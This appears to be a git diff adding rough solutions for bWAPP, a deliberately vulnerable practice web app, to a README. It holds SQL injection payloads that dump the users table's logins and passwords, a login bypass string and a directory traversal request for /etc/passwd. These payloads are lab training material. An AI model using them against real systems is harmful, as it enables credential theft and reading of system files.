@@ -1,6 +1,10 @@
 # solutions-bwapp
 Rough solutions
 
+Ref sheet
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+http://www.sqlinjectionwiki.com/Categories/2/mysql-sql-injection-cheat-sheet/
+
 # A1 - Injection
 
 ### HTML Injection - Reflected (GET)
@@ -79,6 +83,29 @@ Use Burp
 movie=1 UNION ALL SELECT table_schema, table_name, null, null, null, null, null FROM information_schema.tables LIMIT 1 OFFSET 1;--
 ```
 
+### SQL Injection (AJAX/JSON/jQuery)
+Use Burp 
+```
+a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;--
+```
+![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_10_1.png)
+
+a%' UNION ALL SELECT 1, column_name, null, null, null, null, null from information_schema.columns where table_name="users";-- 
+
+blah%' union all select 1,login,password,email,secret,1, 1 from users --
+
+### SQL Injection (Login Form/Hero)
+```
+ok' or 1=1-- 
+```
+### SQL Injection(SQLite)
+
+```
+a%' UNION ALL SELECT 1,sqlite_version(),1,1,1,1; --
+```
+
+
+
 # A6 - Sensitive Data Exposure 
 
 ### Base64 Encoding (Secret)
@@ -94,3 +121,19 @@ directory_traversal_2.php
 ```
 /bWAPP/directory_traversal_2.php?directory=../../../../home/
 ```
+
+### Directory Traversal - Files
+directory_traversal_1.php
+```
+/bWAPP/directory_traversal_1.php?page=../../../../../etc/passwd
+```
+
+### Host Header Attack (Cache Poisoning)
+hostheader_1.php
+
+![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/hostheader_1_1.png)
+
+### Host Header Attack (Reset Poisoning)
+hostheader_2.php
+
+![]()
